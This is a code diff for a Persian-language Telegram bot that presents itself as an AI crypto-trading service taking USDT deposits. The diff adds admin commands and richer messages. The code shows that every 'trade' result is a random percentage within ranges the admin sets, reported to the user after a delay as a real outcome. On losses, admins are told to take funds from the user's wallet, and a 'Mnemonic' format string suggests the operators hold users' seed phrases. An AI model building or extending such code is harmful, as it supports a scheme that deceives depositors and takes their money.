@@ -94,6 +94,8 @@ func showAdminMenu(bot *tgbotapi.BotAPI, db *gorm.DB, chatID int64) {
 		"• `/simplebackup` — دریافت فایل پشتیبان ساده (Go-based)\n\n" +
 		"• `/settrade [شماره معامله] [حداقل درصد] [حداکثر درصد]`\n" +
 		"  └ تنظیم بازه سود/ضرر برای هر ترید\n\n" +
+		"• `/trades`\n" +
+		"  └ نمایش رنج‌های فعلی ترید\n\n" +
 		"• `/setrate [ارز] [نرخ به تومان]`\n" +
 		"  └ تنظیم نرخ به تومان برای ارز مشخص\n\n" +
 		"• `/rates`\n" +
@@ -274,6 +276,17 @@ func StartBot(bot *tgbotapi.BotAPI, db *gorm.DB, cfg *config.Config) {
 						bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "شماره معامله باید فقط ۱، ۲ یا ۳ باشد."))
 						continue
 					}
+
+					// بررسی اعتبار درصدها
+					if minPercent > maxPercent {
+						bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "❌ حداقل درصد نمی‌تواند از حداکثر درصد بیشتر باشد!"))
+						continue
+					}
+
+					if minPercent < -50 || maxPercent > 100 {
+						bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "⚠️ درصدها باید بین -50% تا +100% باشند!"))
+						continue
+					}
 					if err := db.Where("trade_index = ?", tradeIndex).First(&tr).Error; err == nil {
 						tr.MinPercent = minPercent
 						tr.MaxPercent = maxPercent
@@ -282,9 +295,50 @@ func StartBot(bot *tgbotapi.BotAPI, db *gorm.DB, cfg *config.Config) {
 						tr = models.TradeRange{TradeIndex: tradeIndex, MinPercent: minPercent, MaxPercent: maxPercent}
 						db.Create(&tr)
 					}
-					bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, fmt.Sprintf("رنج معامله %d به %.2f تا %.2f تنظیم شد.", tradeIndex, minPercent, maxPercent)))
+					// پیام بهتر برای تنظیم رنج‌های ترید
+					var riskLevel string
+					var riskEmoji string
+
+					if minPercent >= 0 {
+						riskLevel = "کم‌ریسک"
+						riskEmoji = "🟢"
+					} else if minPercent >= -10 {
+						riskLevel = "متوسط"
+						riskEmoji = "🟡"
+					} else {
+						riskLevel = "پرریسک"
+						riskEmoji = "🔴"
+					}
+
+					msg := fmt.Sprintf("%s *رنج معامله %d تنظیم شد*\n\n"+
+						"📊 *بازه درصد:* %.1f%% تا %.1f%%\n"+
+						"⚠️ *سطح ریسک:* %s\n"+
+						"💡 *توضیحات:*\n"+
+						"• حداقل سود: %.1f%%\n"+
+						"• حداکثر ضرر: %.1f%%\n\n"+
+						"✅ تنظیمات با موفقیت ذخیره شد!",
+						riskEmoji, tradeIndex, minPercent, maxPercent, riskLevel,
+						maxPercent, -minPercent)
+
+					message := tgbotapi.NewMessage(update.Message.Chat.ID, msg)
+					message.ParseMode = "Markdown"
+					bot.Send(message)
 				} else {
-					bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "فرمت دستور: /settrade [شماره معامله] [حداقل درصد] [حداکثر درصد]"))
+					helpMsg := "❌ *فرمت دستور اشتباه!*\n\n" +
+						"📝 *فرمت صحیح:*\n" +
+						"`/settrade [شماره معامله] [حداقل درصد] [حداکثر درصد]`\n\n" +
+						"💡 *مثال‌ها:*\n" +
+						"• `/settrade 1 -5 15` - معامله ۱: -۵٪ تا +۱۵٪\n" +
+						"• `/settrade 2 -8 20` - معامله ۲: -۸٪ تا +۲۰٪\n" +
+						"• `/settrade 3 -10 25` - معامله ۳: -۱۰٪ تا +۲۵٪\n\n" +
+						"⚠️ *نکات مهم:*\n" +
+						"• حداقل درصد باید از حداکثر کمتر باشد\n" +
+						"• درصدها بین -۵۰٪ تا +۱۰۰٪ باشند\n" +
+						"• برای مشاهده رنج‌های فعلی: `/trades`"
+
+					message := tgbotapi.NewMessage(update.Message.Chat.ID, helpMsg)
+					message.ParseMode = "Markdown"
+					bot.Send(message)
 				}
 				continue
 			}
@@ -307,8 +361,53 @@ func StartBot(bot *tgbotapi.BotAPI, db *gorm.DB, cfg *config.Config) {
 					}
 					bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, fmt.Sprintf("نرخ *%s* به *%s تومان* با موفقیت ثبت شد.\n\nمثال کاربرد: اگر کاربر ۱۰۰ تتر بخواهد، مبلغ معادل: *%s تومان* خواهد بود.", asset, formatToman(value), formatToman(value*100))))
 				} else {
-					bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "😅 *فرمت درستش اینطوریه:* \n`/setrate [ارز] [نرخ به تومان]` \n\n*مثال:* `/setrate USDT 58500`"))
+					helpMsg := "❌ *فرمت دستور اشتباه!*\n\n" +
+						"📝 *فرمت صحیح:*\n" +
+						"`/setrate [ارز] [نرخ به تومان]`\n\n" +
+						"💡 *مثال‌ها:*\n" +
+						"• `/setrate USDT 58500` - نرخ تتر: ۵۸,۵۰۰ تومان\n" +
+						"• `/setrate BTC 2500000000` - نرخ بیت‌کوین: ۲,۵۰۰,۰۰۰,۰۰۰ تومان\n" +
+						"• `/setrate ETH 150000000` - نرخ اتریوم: ۱۵۰,۰۰۰,۰۰۰ تومان\n\n" +
+						"⚠️ *نکات مهم:*\n" +
+						"• نرخ باید عدد مثبت باشد\n" +
+						"• برای مشاهده نرخ‌های فعلی: `/rates`"
+
+					message := tgbotapi.NewMessage(update.Message.Chat.ID, helpMsg)
+					message.ParseMode = "Markdown"
+					bot.Send(message)
 				}
+				continue
+			}
+			if update.Message.Command() == "trades" {
+				var tradeRanges []models.TradeRange
+				db.Order("trade_index").Find(&tradeRanges)
+				if len(tradeRanges) == 0 {
+					bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "😔 هنوز هیچ رنج تریدی تنظیم نشده! \n\nبرای تنظیم رنج از دستور `/settrade` استفاده کن 👆"))
+					continue
+				}
+				tradeMsg := "📊 *رنج‌های فعلی ترید*\n\n"
+				tradeMsg += "معامله    حداقل    حداکثر    ریسک\n"
+				tradeMsg += "----------------------------------------\n"
+				for _, tr := range tradeRanges {
+					var riskEmoji string
+					if tr.MinPercent >= 0 {
+						riskEmoji = "🟢"
+					} else if tr.MinPercent >= -10 {
+						riskEmoji = "🟡"
+					} else {
+						riskEmoji = "🔴"
+					}
+					tradeMsg += fmt.Sprintf("%-8s %+6.1f%%   %+6.1f%%   %s\n",
+						fmt.Sprintf("#%d", tr.TradeIndex), tr.MinPercent, tr.MaxPercent, riskEmoji)
+				}
+				tradeMsg += "\n💡 *توضیحات:*\n"
+				tradeMsg += "🟢 کم‌ریسک (فقط سود)\n"
+				tradeMsg += "🟡 متوسط (سود و ضرر محدود)\n"
+				tradeMsg += "🔴 پرریسک (ضرر احتمالی بالا)\n\n"
+				tradeMsg += "✏️ برای تغییر رنج هر معامله، از دستور `/settrade [شماره] [حداقل] [حداکثر]` استفاده کن."
+				msg := tgbotapi.NewMessage(update.Message.Chat.ID, tradeMsg)
+				msg.ParseMode = "Markdown"
+				bot.Send(msg)
 				continue
 			}
 			if update.Message.Command() == "rates" {
@@ -333,7 +432,18 @@ func StartBot(bot *tgbotapi.BotAPI, db *gorm.DB, cfg *config.Config) {
 			if update.Message.Command() == "addbalance" {
 				args := strings.Fields(update.Message.CommandArguments())
 				if len(args) != 2 {
-					bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "😅 *فرمت درستش اینطوریه:* \n`/addbalance USER_ID AMOUNT`"))
+					helpMsg := "❌ *فرمت دستور اشتباه!*\n\n" +
+						"📝 *فرمت صحیح:*\n" +
+						"`/addbalance [USER_ID] [AMOUNT]`\n\n" +
+						"💡 *مثال:*\n" +
+						"• `/addbalance 123456789 100` - افزایش موجودی کاربر ۱۲۳۴۵۶۷۸۹ به میزان ۱۰۰ USDT\n\n" +
+						"⚠️ *نکات مهم:*\n" +
+						"• USER_ID باید عدد باشد\n" +
+						"• AMOUNT باید عدد مثبت باشد"
+
+					message := tgbotapi.NewMessage(update.Message.Chat.ID, helpMsg)
+					message.ParseMode = "Markdown"
+					bot.Send(message)
 					continue
 				}
 				userID, err1 := strconv.ParseInt(args[0], 10, 64)
@@ -355,7 +465,18 @@ func StartBot(bot *tgbotapi.BotAPI, db *gorm.DB, cfg *config.Config) {
 			if update.Message.Command() == "subbalance" {
 				args := strings.Fields(update.Message.CommandArguments())
 				if len(args) != 2 {
-					bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "😅 *فرمت درستش اینطوریه:* \n`/subbalance USER_ID AMOUNT`"))
+					helpMsg := "❌ *فرمت دستور اشتباه!*\n\n" +
+						"📝 *فرمت صحیح:*\n" +
+						"`/subbalance [USER_ID] [AMOUNT]`\n\n" +
+						"💡 *مثال:*\n" +
+						"• `/subbalance 123456789 50` - کاهش موجودی کاربر ۱۲۳۴۵۶۷۸۹ به میزان ۵۰ USDT\n\n" +
+						"⚠️ *نکات مهم:*\n" +
+						"• USER_ID باید عدد باشد\n" +
+						"• AMOUNT باید عدد مثبت باشد"
+
+					message := tgbotapi.NewMessage(update.Message.Chat.ID, helpMsg)
+					message.ParseMode = "Markdown"
+					bot.Send(message)
 					continue
 				}
 				userID, err1 := strconv.ParseInt(args[0], 10, 64)
@@ -381,7 +502,18 @@ func StartBot(bot *tgbotapi.BotAPI, db *gorm.DB, cfg *config.Config) {
 			if update.Message.Command() == "setbalance" {
 				args := strings.Fields(update.Message.CommandArguments())
 				if len(args) != 2 {
-					bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "😅 *فرمت درستش اینطوریه:* \n`/setbalance USER_ID AMOUNT`"))
+					helpMsg := "❌ *فرمت دستور اشتباه!*\n\n" +
+						"📝 *فرمت صحیح:*\n" +
+						"`/setbalance [USER_ID] [AMOUNT]`\n\n" +
+						"💡 *مثال:*\n" +
+						"• `/setbalance 123456789 200` - تنظیم موجودی کاربر ۱۲۳۴۵۶۷۸۹ به میزان ۲۰۰ USDT\n\n" +
+						"⚠️ *نکات مهم:*\n" +
+						"• USER_ID باید عدد باشد\n" +
+						"• AMOUNT باید عدد مثبت باشد"
+
+					message := tgbotapi.NewMessage(update.Message.Chat.ID, helpMsg)
+					message.ParseMode = "Markdown"
+					bot.Send(message)
 					continue
 				}
 				userID, err1 := strconv.ParseInt(args[0], 10, 64)
@@ -403,7 +535,17 @@ func StartBot(bot *tgbotapi.BotAPI, db *gorm.DB, cfg *config.Config) {
 			if update.Message.Command() == "userinfo" {
 				args := strings.Fields(update.Message.CommandArguments())
 				if len(args) != 1 {
-					bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "😅 *فرمت درستش اینطوریه:* \n`/userinfo USER_ID`"))
+					helpMsg := "❌ *فرمت دستور اشتباه!*\n\n" +
+						"📝 *فرمت صحیح:*\n" +
+						"`/userinfo [USER_ID]`\n\n" +
+						"💡 *مثال:*\n" +
+						"• `/userinfo 123456789` - نمایش اطلاعات کاربر با شناسه ۱۲۳۴۵۶۷۸۹\n\n" +
+						"⚠️ *نکات مهم:*\n" +
+						"• USER_ID باید عدد باشد"
+
+					message := tgbotapi.NewMessage(update.Message.Chat.ID, helpMsg)
+					message.ParseMode = "Markdown"
+					bot.Send(message)
 					continue
 				}
 				userID, err := strconv.ParseInt(args[0], 10, 64)
@@ -622,11 +764,34 @@ Mnemonic: %s
 					// خواندن رنج درصد از تنظیمات ادمین
 					var tr models.TradeRange
 					if err := db.Where("trade_index = ?", tradeIndex).First(&tr).Error; err != nil {
-						bot.Request(tgbotapi.NewCallback(update.CallbackQuery.ID, "رنج درصد برای این معامله تنظیم نشده است!"))
-						continue
+						// اگر رنج ترید تنظیم نشده، از مقادیر پیش‌فرض استفاده کن
+						bot.Request(tgbotapi.NewCallback(update.CallbackQuery.ID, "⚠️ رنج درصد تنظیم نشده! از مقادیر پیش‌فرض استفاده می‌شود."))
+
+						// ایجاد رنج پیش‌فرض برای این معامله
+						switch tradeIndex {
+						case 1:
+							tr = models.TradeRange{TradeIndex: 1, MinPercent: -5.0, MaxPercent: 15.0}
+						case 2:
+							tr = models.TradeRange{TradeIndex: 2, MinPercent: -8.0, MaxPercent: 20.0}
+						case 3:
+							tr = models.TradeRange{TradeIndex: 3, MinPercent: -10.0, MaxPercent: 25.0}
+						}
+
+						// ذخیره رنج پیش‌فرض در دیتابیس
+						if err := db.Create(&tr).Error; err != nil {
+							log.Printf("❌ Failed to create default trade range %d: %v", tradeIndex, err)
+						} else {
+							log.Printf("✅ Created default trade range %d for user %d: %.1f%% to %.1f%%",
+								tradeIndex, tx.UserID, tr.MinPercent, tr.MaxPercent)
+						}
 					}
+
 					// تولید درصد رندوم در بازه
 					percent := tr.MinPercent + rand.Float64()*(tr.MaxPercent-tr.MinPercent)
+
+					// لاگ کردن اطلاعات ترید برای دیباگ
+					log.Printf("🎯 Trade %d for user %d: range %.1f%% to %.1f%%, generated: %.2f%%",
+						tradeIndex, tx.UserID, tr.MinPercent, tr.MaxPercent, percent)
 					// محاسبه مبلغ جدید
 					var lastAmount float64 = tx.Amount
 					var lastTrade models.TradeResult
@@ -635,6 +800,10 @@ Mnemonic: %s
 						lastAmount = lastTrade.ResultAmount
 					}
 					resultAmount := lastAmount * (1 + percent/100)
+
+					// لاگ کردن محاسبات برای دیباگ
+					log.Printf("💰 Trade calculation: lastAmount=%.2f, percent=%.2f%%, resultAmount=%.2f",
+						lastAmount, percent, resultAmount)
 
 					// به‌روزرسانی سود/ضرر ترید در TradeBalance
 					var user models.User
@@ -665,7 +834,16 @@ Mnemonic: %s
 								walletAddr = user.BEP20Address
 							}
 							// پیام به ادمین
-							adminMsg := fmt.Sprintf("⚠️ کاربر %s (ID: %d) در معامله %s به مقدار %.2f USDT ضرر کرد.\nلطفاً %.2f USDT را از ولت %s کاربر (%s) کسر و به ولت صرافی منتقل کن.", user.FullName, user.TelegramID, network, loss, deducted, network, walletAddr)
+							adminMsg := fmt.Sprintf("⚠️ کاربر %s (ID: %d) در معامله %d %s به مقدار %.2f USDT ضرر کرد.\n\n"+
+								"📊 جزئیات معامله:\n"+
+								"• درصد: %.2f%%\n"+
+								"• مبلغ اولیه: %.2f USDT\n"+
+								"• مبلغ نهایی: %.2f USDT\n"+
+								"• ضرر: %.2f USDT\n\n"+
+								"💳 عملیات مورد نیاز:\n"+
+								"لطفاً %.2f USDT را از ولت %s کاربر (%s) کسر و به ولت صرافی منتقل کن.",
+								user.FullName, user.TelegramID, tradeIndex, network, loss,
+								percent, lastAmount, resultAmount, loss, deducted, network, walletAddr)
 							sendToAllAdmins(bot, adminMsg)
 						} else if profit > 0 {
 							// پیام سود به ادمین
@@ -677,7 +855,15 @@ Mnemonic: %s
 								network = "BEP20"
 								walletAddr = user.BEP20Address
 							}
-							adminMsg := fmt.Sprintf("ℹ️ کاربر %s (ID: %d) در معامله %s %.2f USDT سود کرد.\nآدرس ولت کاربر: %s", user.FullName, user.TelegramID, network, profit, walletAddr)
+							adminMsg := fmt.Sprintf("🎉 کاربر %s (ID: %d) در معامله %d %s %.2f USDT سود کرد!\n\n"+
+								"📊 جزئیات معامله:\n"+
+								"• درصد: %.2f%%\n"+
+								"• مبلغ اولیه: %.2f USDT\n"+
+								"• مبلغ نهایی: %.2f USDT\n"+
+								"• سود: %.2f USDT\n\n"+
+								"💳 آدرس ولت کاربر: %s",
+								user.FullName, user.TelegramID, tradeIndex, network, profit,
+								percent, lastAmount, resultAmount, profit, walletAddr)
 							sendToAllAdmins(bot, adminMsg)
 						}
 						db.Save(&user)
@@ -736,13 +922,53 @@ Mnemonic: %s
 							}
 						}
 					}
-					// پیام به کاربر: بعد از ۱ ثانیه نتیجه را ارسال کن
+					// پیام به کاربر: بعد از ۳۰ دقیقه نتیجه را ارسال کن
 					go func(chatID int64, amount float64, percent float64, resultAmount float64, tradeIndex int) {
 						time.Sleep(30 * time.Minute)
-						msg := fmt.Sprintf("نتیجه معامله %d شما: %+.2f%%\nمبلغ جدید: %.2f USDT", tradeIndex, percent, resultAmount)
-						bot.Send(tgbotapi.NewMessage(chatID, msg))
+
+						// پیام بهتر با جزئیات بیشتر
+						var resultEmoji string
+						var resultText string
+						if percent > 0 {
+							resultEmoji = "🟢"
+							resultText = "سود"
+						} else if percent < 0 {
+							resultEmoji = "🔴"
+							resultText = "ضرر"
+						} else {
+							resultEmoji = "🟡"
+							resultText = "بدون تغییر"
+						}
+
+						msg := fmt.Sprintf("%s *نتیجه معامله %d شما*\n\n"+
+							"💰 مبلغ اولیه: %.2f USDT\n"+
+							"📊 درصد تغییر: %+.2f%% (%s)\n"+
+							"💵 مبلغ جدید: %.2f USDT\n\n"+
+							"⏰ زمان: %s",
+							resultEmoji, tradeIndex, amount, percent, resultText, resultAmount,
+							time.Now().Format("15:04"))
+
+						message := tgbotapi.NewMessage(chatID, msg)
+						message.ParseMode = "Markdown"
+						bot.Send(message)
 					}(update.CallbackQuery.From.ID, lastAmount, percent, resultAmount, tradeIndex)
-					bot.Request(tgbotapi.NewCallback(update.CallbackQuery.ID, fmt.Sprintf("درخواست معامله %d ثبت شد. نتیجه تا ۳۰ دقیقه دیگر اعلام می‌شود.", tradeIndex)))
+					// پیام بهتر برای کاربر
+					var tradeEmoji string
+					if percent > 0 {
+						tradeEmoji = "🚀"
+					} else if percent < 0 {
+						tradeEmoji = "📉"
+					} else {
+						tradeEmoji = "➡️"
+					}
+
+					callbackMsg := fmt.Sprintf("%s *درخواست معامله %d ثبت شد!*\n\n"+
+						"⏰ نتیجه تا ۳۰ دقیقه دیگر اعلام می‌شود\n"+
+						"📊 رنج درصد: %.1f%% تا %.1f%%\n"+
+						"💡 برای مشاهده نتایج: `/trades %d`",
+						tradeEmoji, tradeIndex, tr.MinPercent, tr.MaxPercent, tx.ID)
+
+					bot.Request(tgbotapi.NewCallback(update.CallbackQuery.ID, callbackMsg))
 				} else {
 					bot.Request(tgbotapi.NewCallback(update.CallbackQuery.ID, "امکان ترید بیشتر وجود ندارد"))
 				}
@@ -757,11 +983,61 @@ Mnemonic: %s
 				if len(trades) == 0 {
 					bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "برای این واریز هیچ معامله‌ای انجام نشده است."))
 				} else {
-					msg := "نتایج معاملات این واریز:\n"
-					for _, t := range trades {
-						msg += fmt.Sprintf("معامله %d: %+.2f%% → %.2f USDT\n", t.TradeIndex, t.Percent, t.ResultAmount)
+					msg := "📊 *نتایج معاملات این واریز:*\n\n"
+					var totalProfit float64
+					var initialAmount float64
+
+					for i, t := range trades {
+						if i == 0 {
+							// برای معامله اول، مبلغ اولیه را از تراکنش اصلی بگیر
+							var tx models.Transaction
+							if err := db.First(&tx, t.TransactionID).Error; err == nil {
+								initialAmount = tx.Amount
+							}
+						}
+
+						var emoji string
+						if t.Percent > 0 {
+							emoji = "🟢"
+						} else if t.Percent < 0 {
+							emoji = "🔴"
+						} else {
+							emoji = "🟡"
+						}
+
+						msg += fmt.Sprintf("%s *معامله %d:* %+.2f%% → %.2f USDT\n",
+							emoji, t.TradeIndex, t.Percent, t.ResultAmount)
+
+						// محاسبه سود/ضرر کل
+						if i == 0 {
+							totalProfit = t.ResultAmount - initialAmount
+						} else {
+							var prevTrade models.TradeResult
+							if err := db.Where("transaction_id = ? AND trade_index = ?", t.TransactionID, t.TradeIndex-1).First(&prevTrade).Error; err == nil {
+								totalProfit += t.ResultAmount - prevTrade.ResultAmount
+							}
+						}
 					}
-					bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, msg))
+
+					msg += "\n📈 *خلاصه کلی:*\n"
+					msg += fmt.Sprintf("💰 مبلغ اولیه: %.2f USDT\n", initialAmount)
+					msg += fmt.Sprintf("💵 مبلغ نهایی: %.2f USDT\n", trades[len(trades)-1].ResultAmount)
+
+					var totalEmoji string
+					if totalProfit > 0 {
+						totalEmoji = "🟢"
+						msg += fmt.Sprintf("%s سود کل: +%.2f USDT", totalEmoji, totalProfit)
+					} else if totalProfit < 0 {
+						totalEmoji = "🔴"
+						msg += fmt.Sprintf("%s ضرر کل: %.2f USDT", totalEmoji, totalProfit)
+					} else {
+						totalEmoji = "🟡"
+						msg += fmt.Sprintf("%s بدون تغییر", totalEmoji)
+					}
+
+					message := tgbotapi.NewMessage(update.Message.Chat.ID, msg)
+					message.ParseMode = "Markdown"
+					bot.Send(message)
 				}
 				continue
 			}
@@ -4189,6 +4465,42 @@ func InitializeDefaultSettings(db *gorm.DB) {
 	setSettingIfNotExists(db, models.SETTING_MIN_DEPOSIT_USDT, "100", "حداقل مبلغ واریز (USDT)")
 	setSettingIfNotExists(db, models.SETTING_MIN_WITHDRAW_TOMAN, "5000000", "حداقل مبلغ برداشت (تومان)")
 	setSettingIfNotExists(db, models.SETTING_MAX_WITHDRAW_TOMAN, "100000000", "حداکثر مبلغ برداشت (تومان)")
+
+	// Initialize default trade ranges if they don't exist
+	initializeDefaultTradeRanges(db)
+
+	// Log initialization completion
+	log.Printf("✅ Default settings initialization completed")
+}
+
+// initializeDefaultTradeRanges creates default trade ranges for AI trading
+func initializeDefaultTradeRanges(db *gorm.DB) {
+	// Default trade ranges for 3 trades
+	defaultRanges := []models.TradeRange{
+		{TradeIndex: 1, MinPercent: -5.0, MaxPercent: 15.0},  // Trade 1: -5% to +15%
+		{TradeIndex: 2, MinPercent: -8.0, MaxPercent: 20.0},  // Trade 2: -8% to +20%
+		{TradeIndex: 3, MinPercent: -10.0, MaxPercent: 25.0}, // Trade 3: -10% to +25%
+	}
+
+	log.Printf("🔄 Initializing default trade ranges...")
+
+	for _, tr := range defaultRanges {
+		var existing models.TradeRange
+		if err := db.Where("trade_index = ?", tr.TradeIndex).First(&existing).Error; err != nil {
+			if err == gorm.ErrRecordNotFound {
+				// Create new trade range
+				if err := db.Create(&tr).Error; err != nil {
+					log.Printf("❌ Failed to create default trade range %d: %v", tr.TradeIndex, err)
+				} else {
+					log.Printf("✅ Created default trade range %d: %.1f%% to %.1f%%", tr.TradeIndex, tr.MinPercent, tr.MaxPercent)
+				}
+			}
+		} else {
+			log.Printf("ℹ️ Trade range %d already exists: %.1f%% to %.1f%%", tr.TradeIndex, existing.MinPercent, existing.MaxPercent)
+		}
+	}
+
+	log.Printf("✅ Trade ranges initialization completed")
 }
 
 func setSettingIfNotExists(db *gorm.DB, key, value, description string) error {
@@ -4959,7 +5271,7 @@ func showAllBankAccounts(bot *tgbotapi.BotAPI, db *gorm.DB, chatID int64, userID
 • می‌توانید حساب پیش‌فرض را تغییر دهید
 • حساب‌های اضافی برای آینده ذخیره می‌شوند
 
-⚠️ <b>نکات امنیتی:</b>
+⚠️ <b>نکته‌های امنیتی:</b>
 • هرگز اطلاعات حساب خود را با دیگران به اشتراک نگذارید
 • در صورت مفقود شدن کارت، حتماً حساب را حذف کنید
 • همه حساب‌ها حتماً باید به نام خودتان باشند`
@@ -5149,7 +5461,7 @@ func showDeleteAccountMenu(bot *tgbotapi.BotAPI, db *gorm.DB, chatID int64, user
 		))
 	}
 
-	msgText += `💡 <b>نکات مهم:</b>
+	msgText += `💡 <b>نکته‌های مهم:</b>
 • اگر حساب پیش‌فرض را حذف کنید، یکی از حساب‌های باقی‌مانده پیش‌فرض می‌شود
 • این عمل قابل بازگشت نیست
 • مطمئن شوید که دیگر نیازی به این حساب ندارید`
